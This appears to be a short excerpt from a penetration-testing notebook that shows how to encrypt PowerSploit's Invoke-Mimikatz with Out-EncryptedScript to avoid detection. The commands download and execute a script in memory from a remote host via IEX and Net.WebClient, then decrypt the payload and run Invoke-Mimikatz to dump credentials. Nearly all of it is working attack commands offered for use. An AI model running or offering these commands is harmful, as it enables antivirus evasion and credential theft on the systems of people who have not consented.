	http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1
	>Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password shabiisme -Salt 123456
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/94.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/95.png)

	PS > IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1")
	PS > [String] $cmd = Get-Content .\evil.ps1
	PS > Invoke-Expression $cmd
	PS > $decrypted = de shabiisme 123456
	PS > Invoke-Expression $decrypted
	PS > Invoke-Mimikatz